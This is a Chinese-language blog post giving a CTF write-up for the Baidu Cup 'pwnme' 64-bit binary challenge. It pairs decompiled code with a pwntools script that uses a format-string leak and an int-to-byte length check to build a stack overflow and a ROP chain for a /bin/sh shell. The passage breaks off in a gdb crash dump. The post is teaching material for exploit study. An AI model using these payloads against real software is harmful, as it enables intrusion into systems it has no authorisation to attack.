<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-CN">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="google-site-verification" content="googlea4e6eb27cf4f8663.html" />














  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/avatar.jpg?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/avatar.jpg?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">


  <link rel="manifest" href="/images/manifest.json">


  <meta name="msapplication-config" content="/images/browserconfig.xml" />



  <meta name="keywords" content="CTF,二进制,PWN," />










<meta name="description" content="这算是接触pwntools的第一题吧需要很多二进制知识储备，解释得比较适合新手看，大佬绕行过程跌跌撞撞，写来纪念一下">
<meta name="keywords" content="CTF,二进制,PWN">
<meta property="og:type" content="article">
<meta property="og:title" content="百度杯11月pwnme">
<meta property="og:url" content="https://www.wzsite.cn/2018/01/16/百度杯11月pwnme/index.html">
<meta property="og:site_name" content="Wz&#39;s Blog">
<meta property="og:description" content="这算是接触pwntools的第一题吧需要很多二进制知识储备，解释得比较适合新手看，大佬绕行过程跌跌撞撞，写来纪念一下">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://www.wzsite.cn/2018/01/16/百度杯11月pwnme/13-99-45.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/01/16/百度杯11月pwnme/13-32-01.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/01/16/百度杯11月pwnme/13-32-40.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/01/16/百度杯11月pwnme/13-34-54.jpg">
<meta property="og:image" content="https://www.wzsite.cn/2018/01/16/百度杯11月pwnme/13-42-45.jpg">
<meta property="og:updated_time" content="2018-04-07T13:59:19.483Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="百度杯11月pwnme">
<meta name="twitter:description" content="这算是接触pwntools的第一题吧需要很多二进制知识储备，解释得比较适合新手看，大佬绕行过程跌跌撞撞，写来纪念一下">
<meta name="twitter:image" content="https://www.wzsite.cn/2018/01/16/百度杯11月pwnme/13-99-45.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://www.wzsite.cn/2018/01/16/百度杯11月pwnme/"/>





  <title>百度杯11月pwnme | Wz's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Wz's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">安全菜鸡的挖坑填坑之旅</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            浏览
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://www.wzsite.cn/2018/01/16/百度杯11月pwnme/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="W z">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Wz's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">百度杯11月pwnme</h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-16T13:24:00+08:00">
                2018-01-16
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全之旅/" itemprop="url" rel="index">
                    <span itemprop="name">安全之旅</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <img src="/2018/01/16/百度杯11月pwnme/13-99-45.jpg" alt="13-99-45.jpg" title="">
<blockquote>
<p>这算是接触pwntools的第一题吧<br>需要很多二进制知识储备，解释得比较适合新手看，大佬绕行<br>过程跌跌撞撞，写来纪念一下</p>
</blockquote>
<a id="more"></a>
<p>首先拿到题目，丢IDA，发现是 64位 elf文件</p>
<img src="/2018/01/16/百度杯11月pwnme/13-32-01.jpg" alt="13-32-01.jpg" title="">随意找一下，分析出主程序和主循环<br><br><img src="/2018/01/16/百度杯11月pwnme/13-32-40.jpg" alt="13-32-40.jpg" title="">大致过程就是先打印欢迎界面 -&gt; 先注册 -&gt; 然后主循环，三个选项，分别是打印信息、修改信息、退出<br>很容易发现打印信息函数存在明显的格式化字符串漏洞<br><br><img src="/2018/01/16/百度杯11月pwnme/13-34-54.jpg" alt="13-34-54.jpg" title="">直接打印存入的信息，是一个很明显的格式化字符漏洞<br>我们可以构造一个比如<code>%11$x</code> <code>%11$n</code>的payload去泄露内存，以及修改内存<br>格式化漏洞详情         <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_intro.html" target="_blank" rel="external">CTF Wiki-格式化字符串漏洞 </a><br>然后我们用<code>checksec</code>来看一下程序开了那些保护(github上有此脚本)<br><br><img src="/2018/01/16/百度杯11月pwnme/13-42-45.jpg" alt="13-42-45.jpg" title=""><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ checksec --file pwnme </div><div class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE</div><div class="line">Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		5	pwnme</div></pre></td></tr></table></figure>
<blockquote>
<h4 id="Canary（栈保护）"><a href="#Canary（栈保护）" class="headerlink" title="Canary（栈保护）"></a>Canary（栈保护）</h4><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
<h4 id="NX-DEP（堆栈不可执行）"><a href="#NX-DEP（堆栈不可执行）" class="headerlink" title="NX/DEP（堆栈不可执行）"></a>NX/DEP（堆栈不可执行）</h4><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
<h4 id="PIE-ASLR（地址随机化）"><a href="#PIE-ASLR（地址随机化）" class="headerlink" title="PIE/ASLR（地址随机化）"></a>PIE/ASLR（地址随机化）</h4><p>程序和库加载在内存中地址随机化</p>
<h4 id="Fortify"><a href="#Fortify" class="headerlink" title="Fortify"></a>Fortify</h4><p>与栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。</p>
<h4 id="RelRO"><a href="#RelRO" class="headerlink" title="RelRO"></a>RelRO</h4><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。</p>
</blockquote>
<p><strong><em>以下内容需要先了解ROP</em></strong>          <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/basic_rop.html" target="_blank" rel="external">详情点此处</a><br>可以看出  <code>Full RELRO</code>，并不能修改got表劫持控制流，<code>NX enable</code>也不能执行栈内数据，而且<code>Canary</code>并没用开启。所以有两种思路：一种是利用格式化漏洞泄露<code>system</code>的地址，然后修改栈数据劫持控制流，调用<code>system</code>；另一种是格式化漏洞泄露<code>system</code>地址，然后寻找一个栈溢出漏洞覆盖返回地址劫持控制流<br>参考了各位大佬的思路得知，溢出点在修改信息的修改密码时：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">__int64 __usercall modify@&lt;rax&gt;(__int64 s@&lt;rdi&gt;, __int64 dest@&lt;rdx&gt;, __int64 sa, __int64 a4, __int64 desta, __int64 a6, __int64 a7)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v8; <span class="comment">// [sp+18h] [bp-18h]@3</span></div><div class="line">  <span class="keyword">char</span> v9; <span class="comment">// [sp+1Fh] [bp-11h]@1</span></div><div class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [sp+20h] [bp-10h]@1</span></div><div class="line">  <span class="keyword">void</span> *src; <span class="comment">// [sp+28h] [bp-8h]@1</span></div><div class="line">  <span class="comment">//申请两个300的堆空间</span></div><div class="line">  src = <span class="built_in">malloc</span>(<span class="number">300u</span>LL);</div><div class="line">  buf = <span class="built_in">malloc</span>(<span class="number">300u</span>LL);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"please input new username(max lenth:20): "</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  v9 = read(<span class="number">0</span>, buf, <span class="number">300u</span>LL);<span class="comment">//从输入读300个字节到buf</span></div><div class="line">  <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> || v9 &gt; <span class="number">20</span> )<span class="comment">//判断长度，超过20则退出</span></div><div class="line">  &#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"len error(max lenth:20)!try again.."</span>);</div><div class="line">    fflush(<span class="built_in">stdout</span>);</div><div class="line">    *(_QWORD *)s = sa;<span class="comment">//应该是个结构体，退出时修改会原来的值</span></div><div class="line">    *(_QWORD *)(s + <span class="number">8</span>) = a4;</div><div class="line">    *(_QWORD *)(s + <span class="number">16</span>) = desta;</div><div class="line">    *(_QWORD *)(s + <span class="number">24</span>) = a6;</div><div class="line">    *(_QWORD *)(s + <span class="number">32</span>) = a7;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="number">20u</span>LL);<span class="comment">//名字部分，20字节置0</span></div><div class="line">    <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)&amp;sa, (<span class="keyword">const</span> <span class="keyword">char</span> *)buf);<span class="comment">//字符串拷贝过去，遇0终止</span></div><div class="line"></div><div class="line">    <span class="built_in">puts</span>(<span class="string">"please input new password(max lenth:20): "</span>);</div><div class="line">    fflush(<span class="built_in">stdout</span>);</div><div class="line">    v8 = read(<span class="number">0</span>, src, <span class="number">300u</span>LL);</div><div class="line">    <span class="keyword">if</span> ( (_BYTE)v8 &amp;&amp; (<span class="keyword">unsigned</span> __int8)v8 &lt;= <span class="number">20u</span> )<span class="comment">//问题出在这，输入的长度被类型转换了，由int转成btye，当输入的长度为0x(n*100)至0x(n*100)+0x20都能绕过(n&gt;=1),形成栈溢出</span></div><div class="line">    &#123;</div><div class="line">      <span class="built_in">memset</span>((<span class="keyword">char</span> *)&amp;desta + <span class="number">4</span>, <span class="number">0</span>, <span class="number">20u</span>LL);</div><div class="line">      sub_400A90(src, v8);</div><div class="line">      <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)&amp;desta + <span class="number">4</span>, src, v8);<span class="comment">//用memcpy拷贝，不会遇到0停止</span></div><div class="line">      fflush(<span class="built_in">stdout</span>);</div><div class="line">      *(_QWORD *)s = sa;</div><div class="line">      *(_QWORD *)(s + <span class="number">8</span>) = a4;</div><div class="line">      *(_QWORD *)(s + <span class="number">16</span>) = desta;</div><div class="line">      *(_QWORD *)(s + <span class="number">24</span>) = a6;</div><div class="line">      *(_QWORD *)(s + <span class="number">32</span>) = a7;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"len error(max lenth:20)!try again.."</span>);</div><div class="line">      fflush(<span class="built_in">stdout</span>);</div><div class="line">      *(_QWORD *)s = sa;</div><div class="line">      *(_QWORD *)(s + <span class="number">8</span>) = a4;</div><div class="line">      *(_QWORD *)(s + <span class="number">16</span>) = desta;</div><div class="line">      *(_QWORD *)(s + <span class="number">24</span>) = a6;</div><div class="line">      *(_QWORD *)(s + <span class="number">32</span>) = a7;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> s;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>如上代码分析，我们已经找到一个泄露点和一个溢出点，接下来就需要找到<code>gadget</code>，意思是找到相应的代码，然后跳到此处利用。<br>找<code>gadget</code>需要一些技巧以及经验(这也是我缺少的。。。)<br>首先我们得了解linux x64是怎么传参的<br>它不同于x86的栈传参，它是优先6个寄存器传参，依次是<code>RDI</code>,<code>RSI</code>,<code>RDX</code>,<code>RCX</code>,<code>R8</code>,<code>R9</code>，然后多余的参数才传进栈内<br>我的思路是先leak到<code>system</code>的位置，再寻找适当的<code>gadget</code>将栈上参数pop进寄存器然后再调用<code>read</code>函数将<code>/bin/sh</code>写到<code>.bss</code>段，然后再劫持控制流到<code>pop rdi;ret</code>来起<code>shell</code><br>找<code>gadget</code>的工具有很多，简单的<code>objdump</code>和<code>IDA</code>查找也是可以的，也可以用一些工具</p>
<blockquote>
<p><a href="https://github.com/packz/ropeme" target="_blank" rel="external">ROPEME - https://github.com/packz/ropeme</a><br><a href="https://github.com/sashs/Ropper" target="_blank" rel="external">Ropper -  https://github.com/sashs/Ropper</a><br><a href="https://github.com/JonathanSalwan/ROPgadget/tree/master" target="_blank" rel="external">ROPgadget - https://github.com/JonathanSalwan/ROPgadget/tree/master</a><br><a href="https://github.com/0vercl0k/rp" target="_blank" rel="external">rp++ - https://github.com/0vercl0k/rp</a></p>
</blockquote>
<p>来寻找适合的<code>gadget</code><br>我找到的是第一个<code>0x400ECB - pop_4_ret gadget</code> 和第二个<code>0x400EB0 - mov_call gadget</code> 以及最后一个<code>0x400ed3 - pop_rdi_ret gadget</code><br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">.text</span>:<span class="number">00400</span>EB0		<span class="keyword">mov </span>    rdx, <span class="built_in">r13</span>    <span class="comment">;第二个gadget</span></div><div class="line"><span class="symbol">.text</span>:<span class="number">00400</span>EB3		<span class="keyword">mov </span>    rsi, <span class="built_in">r14</span></div><div class="line"><span class="symbol">.text</span>:<span class="number">00400</span>EB6		<span class="keyword">mov </span>    edi, r15d</div><div class="line"><span class="symbol">.text</span>:<span class="number">00400</span>EB9		call    qword ptr [<span class="built_in">r12</span>+rbx*<span class="number">8</span>]</div><div class="line"><span class="symbol">.text</span>:<span class="number">00400</span>EBD		<span class="keyword">add </span>    rbx, <span class="number">1</span></div><div class="line"><span class="symbol">.text</span>:<span class="number">00400</span>EC1		<span class="keyword">cmp </span>    rbx, rbp</div><div class="line"><span class="symbol">.text</span>:<span class="number">00400</span>EC4		jnz     short loc_400EB0</div><div class="line"></div><div class="line"><span class="symbol">.text</span>:<span class="number">00400</span>EC6		<span class="keyword">add </span>    rsp, <span class="number">8</span></div><div class="line"><span class="symbol">.text</span>:<span class="number">00400</span>ECA		<span class="keyword">pop </span>    rbx</div><div class="line"><span class="symbol">.text</span>:<span class="number">00400</span>ECB		<span class="keyword">pop </span>    rbp <span class="comment">;第一个gadget</span></div><div class="line"><span class="symbol">.text</span>:<span class="number">00400</span>ECC		<span class="keyword">pop </span>    <span class="built_in">r12</span></div><div class="line"><span class="symbol">.text</span>:<span class="number">00400</span>ECE		<span class="keyword">pop </span>    <span class="built_in">r13</span></div><div class="line"><span class="symbol">.text</span>:<span class="number">00400</span>ED0		<span class="keyword">pop </span>    <span class="built_in">r14</span></div><div class="line"><span class="symbol">.text</span>:<span class="number">00400</span>ED2		<span class="keyword">pop </span>    <span class="built_in">r15</span></div><div class="line"><span class="symbol">.text</span>:<span class="number">00400</span>ED4		retn</div><div class="line"></div><div class="line">；<span class="keyword">pop_ret </span>gadget</div><div class="line"><span class="number">0x00400ed3</span> : <span class="keyword">pop </span>rdi <span class="comment">; ret</span></div></pre></td></tr></table></figure></p>
<p>第一和第二个链各个配对的<code>gadget</code>是IDA找到的,<code>pop_ret</code>是ROPgadget脚本找到的<br>回顾一下思路</p>
<blockquote>
<ol>
<li>先leak到<code>system</code>的位置</li>
<li>寻找适当的<code>gadget</code>将栈上参数pop进寄存器然后再调用<code>read</code>函数将<code>/bin/sh</code>写到<code>.bss</code>段</li>
<li>然后再劫持控制流到<code>pop rdi;ret</code>来起<code>shell</code></li>
</ol>
</blockquote>
<p><code>.bss</code>具有可写可读的性质故将<code>/bin/sh</code>写在这段上<br>段地址可以通过<code>readelf</code>确定<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ readelf -S pwnme </div><div class="line">There are 27 section headers, starting at offset 0x2128:</div><div class="line">Section Headers:</div><div class="line">[Nr] Name     Type       Address           Offset Size  EntSize          Flags  Link  Info  Align</div><div class="line">....</div><div class="line">[24] .bss    NOBITS    0000000000602010    00002010 0000000000000020  0000000000000000  WA       0     0     16</div></pre></td></tr></table></figure></p>
<p>得到<code>.bss</code>地址是<code>0x602010</code><br>然后我们回到第一步，泄露<code>system</code>的地址。<br>我利用的是<code>pwntool</code>里面带的<code>DynElf</code>来寻找<code>system</code>在内存中的地址，其实就是利用格式化字符串漏洞泄露内存，然后它执行一个遍历找到目标地址<br><strong><em>以下内容需要了解 Pwntool DynElf</em></strong>（很多资料，多谷歌吧）<br>利用代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment">#pro = process('./pwnme')</span></div><div class="line">pro = remote(<span class="string">'106.75.66.195'</span>, <span class="number">13002</span>)<span class="comment">#连接端口</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span><span class="comment">#学大佬的一个姿势，看起来还不错。作用就是等接收到特定字符再发送想要发送到payload</span></div><div class="line">	pro.recvuntil(recv_buf)</div><div class="line">	<span class="keyword">if</span> new_line:</div><div class="line">		pro.sendline(send_buf)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		pro.send(send_buf)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">loop</span><span class="params">(address)</span>:</span><span class="comment">#就是给DynElf用的一个函数，用来输入一个地址，得到一个内存地址内容返回，以遍历出目标地址</span></div><div class="line">	respone(<span class="string">'&gt;'</span>,<span class="string">'2'</span>)</div><div class="line">	respone(<span class="string">'please input new username(max lenth:20): \n'</span>,<span class="string">'%11$sflag'</span>)<span class="comment">#payload是11是因为我们写入的参数就在第十一个参数的地方，看不懂的话请回到格式化漏洞。当然你也可以直接写到下面的password写成%12$s</span></div><div class="line">	respone(<span class="string">'please input new password(max lenth:20): \n'</span>,<span class="string">'ABCD'</span>+p64(address))<span class="comment">#填充了四个字节之后才是栈内第十一个参数</span></div><div class="line">	respone(<span class="string">'&gt;'</span>,<span class="string">'1'</span>)</div><div class="line">	data = pro.recvuntil(<span class="string">'flag'</span>)[:<span class="number">-4</span>]</div><div class="line">	<span class="keyword">if</span> data == <span class="string">""</span>:</div><div class="line">		data = <span class="string">"\x00"</span></div><div class="line">	<span class="comment">#print data,"add=&gt;",p64(address)</span></div><div class="line">	<span class="keyword">return</span> data</div><div class="line"><span class="comment">#一开始注册的两句话，随便填</span></div><div class="line">respone(<span class="string">'Input your username(max lenth:40): \n'</span>,<span class="string">'123'</span>)</div><div class="line">respone(<span class="string">'Input your password(max lenth:40): \n'</span>,<span class="string">'123'</span>)</div><div class="line"></div><div class="line"><span class="comment">#调用DynElf遍历	</span></div><div class="line">d = DynELF(loop, elf=ELF(<span class="string">'./pwnme'</span>))</div><div class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</div><div class="line"><span class="keyword">print</span> hex(system_addr)</div></pre></td></tr></table></figure></p>
<p>接下来就是了解栈结构然后用栈溢出劫持控制流了<br>我用的是IDA远程调试虚拟机找到栈结构确定是输入password 40字节后是返回地址，你也可以利用<code>pattent.py</code>这个脚本配合<code>gdb</code>调试来寻找<br><code>gdb</code>具体步骤如下:<br>首先生成一个溢出的payload 0x100-0x120均可(前面代码有分析为什么是这个长度)，在此我选择生成0x110即272长度的payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python pattern.py  create 272</div><div class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj</div></pre></td></tr></table></figure></p>
<p>然后<code>gdb ./pwnme</code>调试程序<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">Starting program: /home/testzero/Desktop/ctf/baidu_11_pwn_pwnme/pwnme </div><div class="line">**********************************************</div><div class="line">*                                            *</div><div class="line">*              Have fun!Pwn me               *</div><div class="line">*                                            *</div><div class="line">**********************************************</div><div class="line">Register Account first!</div><div class="line">Input your username(max lenth:40): </div><div class="line">123</div><div class="line">Input your password(max lenth:40): </div><div class="line">123</div><div class="line">Register Success!!</div><div class="line"></div><div class="line">1.Sh0w Account Infomation!</div><div class="line">2.Ed1t Account Inf0mation!</div><div class="line">3.QUit System:</div><div class="line">&gt;2</div><div class="line">please input new username(max lenth:20): </div><div class="line">123</div><div class="line">please input new password(max lenth:20): </div><div class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">0x0000000000400ad0 <span class="keyword">in</span> ?? ()</div><div class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</div><div class="line">[──────────────────────────────────REGISTERS───────────────────────────────────]</div><div class="line">*RAX  0x7fffffffde50 ◂— 0x6141316141306141 (<span class="string">'Aa0Aa1Aa'</span>)</div><div class="line"> RBX  0x0</div><div class="line">*RCX  0x6038e0 ◂— 0x0</div><div class="line">*RDX  0x10</div><div class="line">*RDI  0x7fffffffde50 ◂— 0x6141316141306141 (<span class="string">'Aa0Aa1Aa'</span>)</div><div class="line">*RSI  0x6038f0 ◂— 0x6141316141306141 (<span class="string">'Aa0Aa1Aa'</span>)</div><div class="line">*R8   0x1</div><div class="line">*R9   0x7fffffffde40 ◂— 0x111004010a8</div><div class="line">*R10  0x603af0 ◂— 